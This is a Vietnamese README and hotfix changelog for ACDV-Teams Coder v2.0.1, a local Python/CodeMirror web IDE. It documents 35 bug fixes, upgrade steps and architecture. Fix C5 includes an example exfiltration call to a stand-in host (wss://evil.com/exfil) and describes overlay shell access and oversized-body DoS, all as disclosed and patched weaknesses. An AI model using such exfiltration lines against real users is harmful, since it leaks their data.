ACDV-Teams Coder v2.0.1

Local Web IDE — Python stdlib backend, CodeMirror frontend, module extension system, WebSocket terminal, per-tab undo/redo, ZIP export/import, module storage quota 512 MB, multi-language editing (~50 languages), safe overlay runtime v2.0.1.

Version: 2.0.1 · Platform: Python 3.8+ · Dependencies: none (stdlib only) · Terminal: xterm.js (CDN) · Default port: 8765

Nguyên tắc thiết kế — Edit ≠ Run:
Core hỗ trợ chỉnh sửa và lưu trữ cho ~50 ngôn ngữ (syntax highlighting + lưu file UTF-8).
Core chỉ thực thi các định dạng .py, .js, .sh, .bash.
Mọi ngôn ngữ khác (Java, C/C++, Go, Rust, PHP, Ruby, …) bắt buộc phải cài module —
module tự động pkg install qua Termux và tự spawn compiler/runtime tương ứng.
Không nhúng compiler vào core.

---

§0 — Thay đổi so với v2.0.0

v2.0.1 là bản hotfix toàn diện, khắc phục 35 lỗi được phát hiện sau khi phát hành v2.0.0. Mục này liệt kê toàn bộ thay đổi kèm nguyên nhân gốc, triệu chứng, cách khắc phục và đối tượng bị ảnh hưởng.

Khuyến nghị: Người dùng v2.0.0 hoặc v1.4.x cần nâng cấp lên v2.0.1 ngay lập tức. Đây là bản cập nhật bắt buộc, không phải tùy chọn.

0.1 — Tổng quan

Phân loại Số lỗi Ảnh hưởng chính
Critical 11 Treo hệ thống, mất dữ liệu, vô hiệu hóa tính năng, lỗ hổng bảo mật
High 12 Lỗi chức năng thường gặp, gây nhầm lẫn cho người dùng
Medium 10 Trải nghiệm người dùng kém, silent failure, khó debug
Low 7 Code smell, hardening, edge case hiếm gặp

Không có breaking change với module — module tương thích v2.0.0 chạy được trên v2.0.1. Tuy nhiên module nên được cập nhật để tận dụng các bản vá (đặc biệt C6, H12 nếu có overlay).

0.2 — Critical Fixes (11 lỗi)

C1 — Module watcher dừng ngay khi khởi động

Nguyên nhân gốc: _start_module_watcher() được gọi trong boot() (bước 4/5), trong khi self.running = True chỉ được thiết lập trong run_forever() — chạy sau boot(). Thread khởi động, in "started", điều kiện while not self._watcher_stop and self.running fail ngay lần kiểm tra đầu tiên vì self.running = False, in "stopped" và thoát.

Triệu chứng: Cấu hình auto_detect_modules: true không có hiệu lực. Copy thư mục module vào modules/ không được nạp tự động. Xóa thư mục không được unload. Người dùng phải Reload thủ công qua UI.

Cách khắc phục: Watcher chờ self.running = True trước khi scan bằng cách thêm vòng lặp:

```python
while not self._watcher_stop and not self.running:
    time.sleep(0.2)
```

File ảnh hưởng: core/engine.py → _start_module_watcher()

Đối tượng ảnh hưởng: Developer cài module bằng cách copy thư mục — trước đây tưởng "auto-detect không hoạt động" nhưng thực chất watcher chưa bao giờ chạy.

---

C2 — Watcher không phát hiện thay đổi file

Nguyên nhân gốc: _scan_modules_changes() chỉ xử lý sự kiện "added" và "removed". self._module_mtimes được cập nhật nhưng không bao giờ được so sánh — thiếu nhánh "modified". Hệ quả: sửa main.py hoặc init.txt không auto-reload, kể cả khi C1 đã được fix.

Cách khắc phục: Thêm nhánh so sánh mtime:

```python
for name, mtime_tuple in current.items():
    if name not in self.modules:
        continue
    old = self._module_mtimes.get(name)
    if old is None or old == mtime_tuple:
        continue
    self._module_mtimes[name] = mtime_tuple
    self._reload_module_internal(name)
```

File ảnh hưởng: core/engine.py → _scan_modules_changes()

Đối tượng ảnh hưởng: Developer sửa module — trước đây phải Reload thủ công mỗi lần, hiện tại tự động sau ≤ 2 giây.

---

C3 — Module critical fail không dừng engine

Nguyên nhân gốc: init.txt cho phép khai báo "critical": true (module critical fail → engine exit). Tuy nhiên scan_and_load_all() chỉ print + continue khi load thất bại mà không kiểm tra metadata.critical. Chỉ _recover_sessions() mới kiểm tra critical — nhưng recovery chỉ chạy với module đã load thành công. Module fail ở bước load khiến engine boot tiếp tục trong trạng thái thiếu module.

Triệu chứng: Cấu hình "critical" không có hiệu lực thực tế. Người dùng tin tưởng engine fail-fast nhưng trên thực tế không xảy ra.

Cách khắc phục: Đọc init.txt sơ bộ khi load thất bại; nếu critical: true, gọi engine.fail_critical().

File ảnh hưởng: core/loader.py → scan_and_load_all()

Đối tượng ảnh hưởng: Người dùng module critical (ví dụ: module auth, module database) — trước đây engine tiếp tục chạy trong trạng thái nguy hiểm, hiện tại fail-fast đúng cam kết.

---

C4 — Rò rỉ terminal session

Nguyên nhân gốc: TerminalSession._reader_loop() khi process chết sẽ gửi terminal_exit nhưng không pop khỏi TerminalManager.sessions. Session chỉ bị xóa khi close(term_id) được gọi tường minh hoặc close_by_ws(). Frontend TerminalUI cũng không gửi terminal_close sau exit.

Triệu chứng: Gõ exit trong terminal 8 lần → thông báo "Terminal limit reached (8)". Process đã chết nhưng session object vẫn tồn tại trong dictionary.

Cách khắc phục (3 tầng):

1. Backend: finally block trong _reader_loop pop session khỏi sessions dict.
2. Frontend: Sau terminal_exit, gửi terminal_close (defensive).
3. Defensive: TerminalManager.open() dọn dead sessions trước khi kiểm tra quota.

File ảnh hưởng: core/terminal.py, frontend/js/terminal.js

Đối tượng ảnh hưởng: Mọi người dùng terminal — trước đây phải F5 hoặc restart server mới mở lại được terminal.

---

C5 — CSP connect-src wildcard ws:

Nguyên nhân gốc: Header CSP khai báo connect-src 'self' ws: wss:. Theo CSP specification, ws: là scheme source — mọi URL ws://* và wss://* đều được phép, không chỉ same-origin. Điều này vô hiệu hóa mục đích chống exfiltration của v2.0.0 (README cũ tuyên bố "chặn overlay gọi mạng ngoài" nhưng thực tế không chặn được WebSocket).

Triệu chứng: Overlay độc hại vẫn có thể new WebSocket("wss://evil.com/exfil") — CSP hoàn toàn không chặn.

Cách khắc phục: Siết connect-src theo host:port hiện tại:

```python
host = self.host if self.host and self.host != "0.0.0.0" else "localhost"
ws_origin = f"ws://{host}:{self.port} wss://{host}:{self.port}"
if host != "localhost":
    ws_origin += f" ws://localhost:{self.port} wss://localhost:{self.port}"
"connect-src 'self' " + ws_origin + ";"
```

File ảnh hưởng: core/server.py → _csp_headers()

Đối tượng ảnh hưởng: Toàn bộ người dùng — bảo mật overlay được siết đúng như cam kết.

Lưu ý: Fix này vẫn chưa triệt để — overlay vẫn có thể gửi terminal_open qua WebSocket same-origin → shell thực thi với quyền người dùng. Fix triệt để yêu cầu iframe sandbox (roadmap v2.1). Đây là thay đổi nhận thức — README v2.0.0 ghi "CSP chặn exfil" nhưng không chính xác 100%.

---

C6 — Overlay unload xóa CSS khi tắt JS

Nguyên nhân gốc: Trong refresh(), khi người dùng tắt JS (giữ CSS), code gọi ACDV.unload(name). Hàm này xóa cả scriptEl và linkEl (CSS) khỏi DOM. Sau đó ACDV._injected.set(name, existing) — existing.linkEl vẫn giữ reference tới element đã bị remove, nên refresh lần sau không re-inject CSS.

Triệu chứng: Toggle "JS off" trong Settings một lần → CSS của module đó biến mất vĩnh viễn cho đến khi reload page.

Cách khắc phục: Tách _unloadJsOnly(name) — chỉ dọn script, giữ link CSS. Nhánh !jsOn gọi hàm này thay vì unload().

File ảnh hưởng: frontend/js/overlay.js

Đối tượng ảnh hưởng: Developer overlay — toggle JS không còn làm mất CSS.

---

C7 — Editor reset dirty flag khi lazy-load mode

Nguyên nhân gốc: Khi người dùng mở file .ts lần đầu, mode typescript chưa load → tab tạo với plaintext. Background load mode (~200 ms), sau đó _recreateDocWithMode() chạy:

```javascript
const val = this.cm.getValue();   // có thể đã có edit
tab.doc = newDoc;
tab.content = val;                // ← GHI ĐÈ content = giá trị editor hiện tại
```

Dirty flag tính lại: current === tab.content → false → mất dấu hiệu ● unsaved.

Triệu chứng: Người dùng gõ trong 200 ms đầu trước khi mode load xong → không thấy dấu ● → tưởng đã save (thực tế chưa) → đóng tab → mất edit (vì close() thấy dirty=false, không confirm).

Cách khắc phục: Chỉ cập nhật tab.content khi !wasDirty:

```javascript
const wasDirty = !!tab.dirty;
tab.doc = newDoc;
if (!wasDirty) tab.content = val;
tab.dirty = wasDirty;
```

File ảnh hưởng: frontend/js/editor.js → _recreateDocWithMode()

Đối tượng ảnh hưởng: Người dùng mở file có lazy-load mode (TypeScript, Java, C, Go, Rust, …) — không còn mất cảnh báo unsaved.

---

C8 — Diagnostics markers mất sau lazy-load mode

Nguyên nhân gốc: _recreateDocWithMode() tạo newDoc + swapDoc(). Marks cũ gắn với old doc → bị loại bỏ. Tuy nhiên không gọi lại DiagnosticsUI.setFileDiagnostics() → markers không được render lại.

Triệu chứng: File mở lần đầu, diagnostics render trước khi mode load → markers mất sau khi mode load xong.

Cách khắc phục: Cuối _recreateDocWithMode(), gọi lại DiagnosticsUI.setFileDiagnostics() với diagnostics hiện tại (nếu là tab đang active).

File ảnh hưởng: frontend/js/editor.js

Đối tượng ảnh hưởng: Người dùng có module diagnostics (ví dụ code_reminder) — không còn thấy markers "nháy mất".

---

C9 — Diagnostics cleared lỗi với nested path

Nguyên nhân gốc: Key trong state.markers là "project/path". Khi diagnostics_cleared, code làm k.split('/') để lấy project/path. Nhưng path có thể chứa / (ví dụ src/main.py) → split('/') cho ["project", "src", "main.py"] → gọi clearMarkersFor("project", "src", "main.py") — tham số thứ 3 bị bỏ qua → marker của src/main.py không bị clear.

Triệu chứng: File trong subdirectory → markers stale không bao giờ clear.

Cách khắc phục: Sử dụng separator đặc biệt \u0000 thay vì /:

```javascript
const SEP = '\u0000';
function key(project, path) { return project + SEP + path; }
function parseKey(k) {
    const i = k.indexOf(SEP);
    return i < 0 ? [k, ''] : [k.substring(0, i), k.substring(i + 1)];
}
```

File ảnh hưởng: frontend/js/diagnostics.js

Đối tượng ảnh hưởng: Người dùng có project nested (src/main.py, lib/utils.py, …) — markers clear đúng.

---

C10 — Save sau delete project → project "tái sinh"

Nguyên nhân gốc: write_file() trong ProjectManager không kiểm tra project tồn tại trước khi ghi. Code:

```python
target = self._safe_path(project, path)   # resolve path, không check dir
parent = os.path.dirname(target)
os.makedirs(parent, exist_ok=True)        # ← tạo lại project dir!
```

Triệu chứng: Người dùng mở file trong tab editor → delete project → tab vẫn tồn tại → nhấn Ctrl+S → write_file tạo lại projects/<name>/ → project "tái sinh" một phần.

Cách khắc phục (2 tầng):

1. Backend: write_file, create_file, create_folder gọi _ensure_project_exists(project) trước khi ghi — raise nếu project không tồn tại.
2. Frontend: Server broadcast project_deleted → client đóng tab tương ứng (fix M8).

File ảnh hưởng: core/project_manager.py, frontend/js/app.js

Đối tượng ảnh hưởng: Toàn bộ người dùng — không còn "project ma" sau khi xóa.

---

C11 — Output module bị trộn vào panel Run của core

Nguyên nhân gốc: _onRunOutput() không filter theo m.project. Module lang_java broadcast run_output với project="(module)" (marker đặc biệt) → output bị trộn vào panel Run của người dùng đang chạy Python.

Triệu chứng: Người dùng đang chạy demo/main.py → module lang_java compile project khác → log compiler Java xuất hiện xen kẽ output Python. Không thể debug.

Cách khắc phục: Filter by project:

```javascript
if (this._run.project && m.project !== this._run.project) {
    const tag = m.project === "(module)" ? `[module:${m.path}]` : `[${m.project}/${m.path}]`;
    for (const ln of text.split("\n")) {
        if (ln === "") continue;
        this.log(`${tag} ${ln}`, "info");   // → Output panel, không phải Run
    }
    return;
}
```

File ảnh hưởng: frontend/js/app.js

Đối tượng ảnh hưởng: Người dùng chạy module compile + core run đồng thời — không còn trộn log.

---

0.3 — High Fixes (12 lỗi)

H1 — Bất nhất version và port

Nguyên nhân gốc:

· config.json → "version": "1.4.0", "port": 8889
· core/__init__.py → __version__ = "1.4.0"
· README.md → "v2.0.0", port 8765

Triệu chứng: UI hiển thị v1.4.0 dù có tính năng 2.0. Người dùng theo README mở http://localhost:8765 → không kết nối được (server chạy 8889) → tưởng server treo.

Cách khắc phục: Đồng bộ version 3 file về 2.0.1, đổi port về 8765.

File ảnh hưởng: config.json, core/__init__.py

Đối tượng ảnh hưởng: Người dùng mới onboarding — mở đúng port, thấy đúng version.

---

H2 — /api/readme đọc wecom.md nhưng báo lỗi README.md not found

Nguyên nhân gốc: Code hard-code đọc wecom.md, nhưng error message ghi "README.md not found at project root". Nếu người dùng rename wecom.md → README.md (theo thông lệ), welcome screen không load được, error message lại nói "README.md not found" (mâu thuẫn).

Cách khắc phục: Fallback thử cả 3 tên:

```python
for fname in ("wecom.md", "README.md", "readme.md"):
    p = os.path.join(self.base_dir, fname)
    if os.path.isfile(p):
        readme_path = p
        break
else:
    return {"ok": False, "error": "Không tìm thấy README (wecom.md / README.md)"}
```

File ảnh hưởng: core/engine.py → _api_readme()

Đối tượng ảnh hưởng: Người dùng rename README — load được, error message rõ ràng.

---

H3 — HTTP body không có giới hạn

Nguyên nhân gốc: _handle_client() đọc Content-Length rồi loop client.recv() cho đến khi đủ body. Không có kiểm tra max.

Triệu chứng: Client gửi Content-Length: 9999999999 → server đọc đến khi OOM hoặc hết disk → treo toàn bộ process.

Cách khắc phục: Cap MAX_BODY_BYTES = 64 * 1024 * 1024 (64 MB — đủ cho project ZIP lớn), trả về 413 Payload Too Large nếu vượt.

File ảnh hưởng: core/server.py

Đối tượng ảnh hưởng: Toàn hệ thống — DoS qua body lớn bị chặn.

---

H4 — WebSocket idle 5 phút timeout → terminal chết ngầm

Nguyên nhân gốc: Server set client.settimeout(300) (5 phút). Không có ping/pong keep-alive định kỳ. Frontend không gửi gì trong 5 phút → server đóng WS → terminal session bị kill (qua close_by_ws).

Triệu chứng: Người dùng mở terminal, không tương tác 5 phút → terminal "chết". Refresh → mất session cũ, mất output trước đó.

Cách khắc phục: Frontend WSClient gửi ping mỗi 90 giây. Nếu 3 phút không nhận pong → force close + reconnect.

File ảnh hưởng: frontend/js/ws.js

Đối tượng ảnh hưởng: Mọi người dùng terminal — không còn "terminal chết sau 5 phút".

---

H5 — Settings ghi không atomic

Nguyên nhân gốc: update_global() / update_module() ghi file JSON trực tiếp:

```python
with open(path, "w") as f:
    json.dump(updated, f)
```

Nếu process bị kill giữa json.dump (OOM, SIGTERM bất ngờ) → file corrupt. Lần load sau json.load fail → fallback defaults → toàn bộ settings người dùng mất sạch.

Cách khắc phục: Atomic write (tmp + fsync + replace):

```python
tmp = path + ".tmp"
with open(tmp, "w") as f:
    json.dump(updated, f, indent=2)
    f.flush()
    os.fsync(f.fileno())
os.replace(tmp, path)
```

File ảnh hưởng: core/settings.py, core/engine.py (cho config.json)

Đối tượng ảnh hưởng: Mọi người dùng — không còn "settings reset về default" không rõ lý do.

---

H6 — Chunk upload chỉ assemble khi chunk cuối đến

Nguyên nhân gốc: upload_chunk() chỉ assemble khi chunk_index == total_chunks - 1. Nếu mạng reorder (proxy, parallel client) → chunk cuối đến trước → raise "Missing chunk" → upload fail dù sau đó chunk khác đến.

Cách khắc phục: Track số chunk đã nhận, assemble khi đủ (bất kể thứ tự).

File ảnh hưởng: core/module_storage.py

Đối tượng ảnh hưởng: Developer viết client upload parallel, hoặc người dùng sau proxy reorder — upload không còn fail ngẫu nhiên.

---

H7 — Storage meta corrupt khi concurrent upload

Nguyên nhân gốc: _touch_meta() đọc .storage.json → update → ghi đè. Không có lock. Hai upload chạy song song → cả hai đọc → ghi đè nhau → mất entry của một file.

Cách khắc phục: Wrap trong with self.lock: + atomic write (tmp + fsync + replace).

File ảnh hưởng: core/module_storage.py

Đối tượng ảnh hưởng: Người dùng upload nhiều file cùng lúc — metadata không còn corrupt.

---

H8 — Quota check chỉ áp dụng cho chunk đầu

Nguyên nhân gốc: check_quota() chỉ được gọi khi chunk_index == 0. Client khai total_size: 100 nhưng gửi thực tế 1 GB → chunk đầu OK, các chunk sau ghi đĩa tự do → vượt quota.

Cách khắc phục: Check lại lúc assemble (dùng actual_size = sum(os.path.getsize(...))).

File ảnh hưởng: core/module_storage.py

Đối tượng ảnh hưởng: Bảo mật — quota không còn bị bypass.

---

H9 — Upload fail báo sai khi check_and_warn raise

Nguyên nhân gốc: _api_storage_upload_chunk() bọc check_and_warn() trong try/except Exception. Nếu check_and_warn raise (IO error đọc files_dir) → exception bị nuốt → trả {ok: false}. Nhưng file đã upload xong trên disk. Người dùng thấy lỗi, tưởng chưa upload, upload lại → ghi đè. Data loss tiềm ẩn.

Cách khắc phục: Tách check_and_warn khỏi kết quả upload:

```python
try:
    result = self.storage.upload_chunk(...)
except QuotaExceeded:
    ...
except Exception as e:
    return {"ok": False, "error": str(e)}

if result.get("completed"):
    try:
        warn = self.storage.check_and_warn(name)
        ...
    except Exception:
        pass  # không fail upload vì warning
return result
```

File ảnh hưởng: core/engine.py

Đối tượng ảnh hưởng: Người dùng upload — không còn "báo lỗi dù file đã lưu".

---

H10 — Diagnostics stale sau module reload

Nguyên nhân gốc: _api_reload() không clear _diag_cache của module vừa reload. Người dùng reload module code_reminder (đổi logic diagnose) → mở file .py → vẫn thấy diagnostics cũ.

Cách khắc phục: Thêm _clear_module_diags(name) — filter _diag_cache theo d.source == name.

File ảnh hưởng: core/engine.py

Đối tượng ảnh hưởng: Developer module diagnostics — reload có hiệu lực ngay.

---

H11 — Install lại module bỏ qua on_shutdown của instance cũ

Nguyên nhân gốc: Kịch bản: module loaded, thư mục bị xóa tay. Người dùng upload ZIP cùng tên → target_dir không tồn tại → extract OK → load_module → engine.modules[name] = new_instance. Instance cũ không được gọi on_shutdown() → resource (thread, file handle) rò rỉ.

Cách khắc phục: Trong install_from_zip, trước khi extract, shutdown instance in-memory (nếu có) + unregister routes + diagnostics + settings.

File ảnh hưởng: core/loader.py

Đối tượng ảnh hưởng: Developer cài lại module — không còn leak thread/handle.

---

H12 — Overlay double-init race

Nguyên nhân gốc: register() đẩy waiter vào _appWaiters. Khi App ready, waiter chạy check this._modules.has(name). Nếu register lại cùng tên trước App ready → record cũ bị xóa, record mới được tạo → waiter cũ vẫn chạy (vì _modules.has(name) = true do record mới tồn tại) → gọi fnA (sai, phải gọi fnB) → fnA + fnB cùng chạy → trùng handler, trùng timer.

Cách khắc phục: Check theo identity của record, không theo tên:

```javascript
this.whenAppReady(() => {
    if (this._modules.get(name) !== record) return;   // ← so sánh instance
    record.initCalled = true;
    initFn(ctx);
});
```

File ảnh hưởng: frontend/js/overlay.js

Đối tượng ảnh hưởng: Developer overlay — không còn double-init trong edge case.

---

0.4 — Medium Fixes (10 lỗi)

Bug Nguyên nhân Cách khắc phục File
M1 Settings save error không hiển thị errors[] Helper formatSaveError(res) — ưu tiên errors.join('; ') settings.js
M4 Storage UI hiển thị f.name, nhầm khi nested Hiển thị f.path nếu khác f.name storage_ui.js
M5 Upload trùng tên ghi đè silent Check existingPaths trước upload, confirm nếu conflict storage_ui.js
M6 App init fail → trang blank, không UX _showFatal(msg) overlay + App.init().catch() app.js
M7 File xóa không đóng tab editor → save sau resurrect Broadcast project_file_deleted → client closeByPath() engine.py, app.js, editor.js
M8 Project xóa không đóng tab editor Broadcast project_deleted → client closeByProject() engine.py, app.js, editor.js
M9 Config change không broadcast → 2 tab tranh chấp Broadcast config_changed → client reload SettingsUI engine.py, app.js
M11 Overlay khai báo nhưng file missing không cảnh báo Server log warning nếu etag = "" engine.py, loader.py
M12 Settings UI không refresh khi settings_changed broadcast Reload SettingsUI nếu modal đang mở app.js
M14 Terminal open fail do queue đầy → "Connecting…" mãi Check ws.send() return, retry sau 2 s terminal.js

---

0.5 — Low Fixes (7 lỗi)

Bug Nguyên nhân Cách khắc phục File
L1 Serve dotfiles (/.env, /.git/) Check part.startswith(".") server.py
L2 Không hỗ trợ Range header Parse Range: bytes=... → 206 Partial Content server.py
L5 SIGWINCH race khi terminal resize trên proc đã chết Guard if proc.poll() is None terminal.py
L8 Log name collision giữa a/b.py và a_b.py Dùng SHA1 hash của path runner.py
L10 Không cleanup log cũ → đầy disk Xóa log > 7 ngày mỗi khi init runner runner.py
L15 provider.diagnose() không timeout → treo thread Wrap trong thread + timeout 5 s diagnostics.py
L16 Ctrl+S trong input Settings save editor Check _isEditableTarget(e.target) app.js

---

0.6 — Cải tiến bổ sung (không phải bug fix)

Cải tiến Mô tả File
Module route unregister _unregister_module_routes() — xóa route khỏi router khi reload/uninstall, không còn route "mồ côi" engine.py, router.py
_reload_module_internal() DRY: dùng chung cho _api_reload() và watcher reload engine.py
_clear_module_diags() Xóa diagnostics theo source — dùng cho reload engine.py
Node.js hint Error message rõ ràng khi chạy .js mà thiếu Node runner.py
closeByPath / closeByProject Editor tự đóng tab khi file/project bị xóa editor.js
_unloadJsOnly() Overlay: tắt JS không đụng CSS overlay.js

---

0.7 — Breaking Changes

Không có breaking change với module. Module v2.0.0 chạy được trên v2.0.1.

Khuyến nghị cập nhật:

· Module dùng overlay: Cập nhật để tránh C6 (tắt JS mất CSS) và H12 (double-init).
· Module có critical: true: v2.0.1 thực hiện fail-fast đúng cam kết (trước đây không) — kiểm tra lại module có sẵn sàng fail-fast.
· Module dùng run_output với project="(module)": v2.0.1 route vào Output panel thay vì Run panel (không breaking, nhưng UX khác).

Breaking với người dùng v1.x: Không. Nên đọc CHANGELOG v2.0.0 trước.

---

0.8 — Hướng dẫn nâng cấp

```bash
# 1. Backup
cp -r /path/to/acdv-coder /path/to/acdv-coder.backup

# 2. Kill process cũ
pkill -f "python main.py"
fuser -k 8889/tcp 2>/dev/null
fuser -k 8765/tcp 2>/dev/null

# 3. Copy đè file (theo danh sách dưới)

# 4. Clean state cũ (nếu port đổi từ 8889 → 8765)
rm core/data/.run_pids.json
# Không xóa settings.json — schema không đổi

# 5. Chạy lại
python3 main.py

# 6. Hard reload browser
# Ctrl + Shift + R (không phải F5)
```

Danh sách 20 file đã sửa:

· config.json, core/__init__.py
· core/router.py, core/engine.py, core/loader.py
· core/terminal.py, core/server.py, core/settings.py
· core/module_storage.py, core/diagnostics.py
· core/project_manager.py, core/runner.py
· frontend/js/ws.js, frontend/js/overlay.js
· frontend/js/editor.js, frontend/js/diagnostics.js
· frontend/js/terminal.js, frontend/js/storage_ui.js
· frontend/js/app.js, frontend/js/settings.js

---

Mục lục

1. Status
2. Quick Start
3. Cấu trúc thư mục
4. Architecture
5. Module Contract
6. Overlay Runtime v2.0.1
7. Multi-language Editing
8. Module Storage
9. API Reference
10. WebSocket Protocol
11. Frontend / Editor
12. Undo / Redo
13. Terminal
14. Export / Import ZIP
15. Loading & Restart
16. Dev Workflow
17. Testing Cheat-sheet
18. Troubleshooting
19. Known Issues / Roadmap
20. Legal

---

1. Status

Layer State
Core engine + router + server Ổn định (v2.0.1 — C1–C5, H1–H3)
Project manager + ZIP upload/export Ổn định (v2.0.1 — C10)
Process runner (.py / .js / .sh / .bash) Ổn định (v2.0.1 — L8, L10)
Module loader + ZIP install/export Ổn định (v2.0.1 — C3, H11)
Overlay Runtime v2.0.1 v2.0.1 — cleanup registry, ETag, CSP siết, C6, H12
WS client (queue, off, once, heartbeat) v2.0.1 — H4
Terminal (xterm.js + PTY) v2.0.1 — C4, L5, M14
Diagnostics (VS Code style) v2.0.1 — C8, C9, H10, L15
Settings (global + per-module) v2.0.1 — H5, M12
Module Storage (quota 512 MB) v2.0.1 — H6, H7, H8, H9, M4, M5
Multi-language edit (~50 ngôn ngữ) v2.0.1 — C7
CSP connect-src v2.0.1 — C5 (siết host:port)
Project watcher v2.0.1 — C1, C2
Frontend editor + explorer Ổn định (v2.0.1 — M7, M8)
Frontend settings UI + About Ổn định (v2.0.1 — M1)
Frontend diagnostics UI Ổn định
Code folding v1.3.1
Android editor v1.3.2
Theme switcher v1.3.2
Undo / Redo per-tab v1.3.3
Dirty flag chính xác v2.0.1 — C7
Editor line wrap v1.3.1
Loading overlay v1.4.0 + v2.0.1 (M6)
System controls (restart/shutdown) v1.3.5
Export Project / Module ZIP v1.3.6
Demo module modules/demo_module/
Code reminder module modules/code_reminder/
Error dispatch chain ⚠️ Mới — cần test thêm
Module marketplace 🚧 v2.2.0 roadmap
Overlay iframe sandbox 🚧 v2.1.0 roadmap

---

2. Quick Start

```bash
cd /path/to/acdv-coder
python3 main.py
```

Mở: http://localhost:8765

Thử ngay:

· Tab Projects → ＋ → chọn ngôn ngữ (Python, Java, C, Rust, …) → file mẫu tự sinh.
· Nhấn ▶ để chạy .py / .js / .sh / .bash (các ngôn ngữ khác cần module — xem §7).

Xử lý sự cố nhanh:

```bash
# 1. Xác minh main.py là entry point đúng
head -1 main.py
# Kỳ vọng: #!/usr/bin/env python3

# 2. Xác minh import chain
python3 -c "from core.engine import CoreEngine; print('OK')"

# 3. Port bị chiếm
python3 main.py --port 9000
# hoặc
fuser -k 8765/tcp

# 4. Reset trạng thái
pkill -f "python main.py"
rm core/data/.run_pids.json
rm core/data/settings.json
```

---

3. Cấu trúc thư mục

```
acdv-coder/
├── main.py                    # Entry point — KHÔNG được đè
├── config.json                # host/port/version/terminal/storage quota
├── wecom.md                   # Welcome screen (ưu tiên)
├── README.md                  # Tài liệu đầy đủ (fallback) — file này
│
├── core/                      # Backend (Python stdlib)
│   ├── __init__.py            # __version__ = "2.0.1"
│   ├── engine.py              # CoreEngine: boot, routes, error dispatch, storage API
│   ├── server.py              # HTTP + WS (CSP, ETag, TLS, Range support)
│   ├── router.py              # (method, path) → handler, core-protected, remove()
│   ├── loader.py              # ModuleBase + ModuleLoader (ETag overlay, ZIP install/export)
│   ├── sandbox.py             # Per-module fs jail (data/)
│   ├── module_storage.py      # ModuleStorage (quota 512MB, chunked upload, atomic meta)
│   ├── project_manager.py     # Project CRUD + file ops + starter templates
│   ├── runner.py              # ProcessRunner (chỉ .py/.js/.sh/.bash, hash log name)
│   ├── settings.py            # Global + per-module settings, atomic write
│   ├── diagnostics.py         # DiagnosticsManager (5s timeout)
│   ├── terminal.py            # TerminalManager (PTY + WS, self-cleanup on exit)
│   └── data/                  # Auto-created: logs/, settings.json, .run_pids.json, certs/
│
├── frontend/
│   ├── index.html
│   ├── css/style.css
│   └── js/
│       ├── api.js             # REST client
│       ├── ws.js              # v2.0.1: queue, off/once, heartbeat 90s
│       ├── explorer.js        # Project list + file tree
│       ├── editor.js          # _mode() map ~50 extension, dirty-safe lazy load
│       ├── app.js             # v2.0.1: _showFatal, closeByPath/Project, C11 filter
│       ├── diagnostics.js     # v2.0.1: SEP '\0' cho nested path
│       ├── settings.js        # Settings UI + About tab
│       ├── terminal.js        # v2.0.1: ws.send check + defensive close
│       ├── overlay.js         # v2.0.1: _unloadJsOnly, record identity check
│       ├── suggest.js         # CodeMirror autocomplete
│       └── storage_ui.js      # v2.0.1: path display + overwrite warning
│
├── modules/
│   ├── demo_module/           # Template đầy đủ contract + overlay v2.0.1
│   ├── code_reminder/         # Ví dụ: diagnostics module thực tế
│   └── <your_module>/
│       ├── init.txt           # Metadata (JSON)
│       ├── main.py            # Class Module
│       ├── data/              # Sandbox + overlay file lớn + settings.json
│       │   ├── overlay.css    # ưu tiên cao nhất (file lớn)
│       │   ├── overlay.js
│       │   └── settings.json
│       ├── storage/           # Storage riêng (quota 512MB)
│       │   ├── files/
│       │   ├── .storage.json
│       │   └── .tmp_uploads/
│       └── web/
│           ├── index.html     # (optional) custom UI page
│           ├── overlay.css    # fallback (file nhỏ)
│           └── overlay.js
│
├── projects/                  # User projects
└── overrides/                 # Optional .py patches (dev only)
```

---

4. Architecture

```
┌──────────────────────────────────────────────────────┐
│  Browser (CodeMirror + xterm.js + vanilla JS)        │
│  ws.js → queue, off/once, heartbeat 90s              │
│  overlay.js → ACDV Runtime v2.0.1 (cleanup registry) │
│  editor.js _mode() → ~50 language modes (edit-only)  │
│  app.js → _showFatal, closeByPath/Project            │
└──────────────────┬───────────────────────────────────┘
                   │ HTTP + WS (CSP siết, ETag 304, TLS, Range)
┌──────────────────▼───────────────────────────────────┐
│  CoreEngine (core/engine.py)                         │
│  ├─ Router       (core-protected, remove())          │
│  ├─ HttpWsServer (raw socket, WS frames, TLS,        │
│  │               CSP siết, 64MB body cap, Range)     │
│  ├─ ModuleLoader (scan modules/, ETag overlay)       │
│  ├─ Sandbox      (per-module fs jail data/)          │
│  ├─ ModuleStorage(per-module quota 512MB, atomic)    │
│  ├─ ProcessRunner(subprocess + process-group kill)   │
│  ├─ SettingsMgr  (global + per-module, atomic write) │
│  ├─ Diagnostics  (5s timeout per provider)           │
│  ├─ TerminalMgr  (PTY per WS, self-cleanup on exit)  │
│  └─ ErrorDispatch(chain: module interceptors)        │
└──────────────────┬───────────────────────────────────┘
                   │
┌──────────────────▼───────────────────────────────────┐
│  Disk: projects/, modules/, core/data/, frontend/    │
└──────────────────────────────────────────────────────┘
```

Luồng quyết định: Edit vs Run

```
Người dùng mở file .java
  → editor.js _mode(".java") → "text/x-java"
  → CodeMirror hiển thị syntax highlighting Java ✅ (chỉ EDIT)
  → Ctrl+S → API.writeFile → lưu xuống đĩa ✅

Người dùng nhấn ▶ (Run)
  → API.runFile(project, "Main.java")
  → runner.py _cmd_for("Main.java")
  → ext = ".java" → KHÔNG trong SUPPORTED
  → raise Exception("Core không hỗ trợ chạy/compile '.java'. ... phải cài module ...")
  → app.js hiển thị lỗi + hướng dẫn cài module lang_java
```

Luồng Overlay v2.0.1

```
App.init() chạy
  → khởi tạo EditorManager, WSClient
  → ... load projects, readme, modules ...
  → App._markReady() → _isReady = true
  → gọi các callback đăng ký qua App.whenReady()

overlay.js (frontend runtime)
  → bootstrap() → refresh()
  → fetch /api/overlay → list module có overlay
  → với mỗi overlay:
      → nếu chưa inject hoặc etag đổi → inject <link>/<script>
      → script gọi ACDV.register(name, initFn)
      → ACDV lưu cleanup, chờ App ready
      → khi App ready + record identity khớp → chạy initFn(ctx)

ctx (context object)
  → ctx.cmOn(evt, fn)      → track cleanup cho cm.off
  → ctx.wsOn(evt, fn)      → track cleanup cho ws.off
  → ctx.on(target, evt, fn)→ track cleanup cho removeEventListener
  → ctx.append(parent, el) → track cleanup cho DOM removal
  → ctx.interval(fn, ms)   → track cleanup cho clearInterval

Khi module bị reload/uninstall/safe_mode:
  → ACDV.unload(name) [full] hoặc ACDV._unloadJsOnly(name) [chỉ JS]
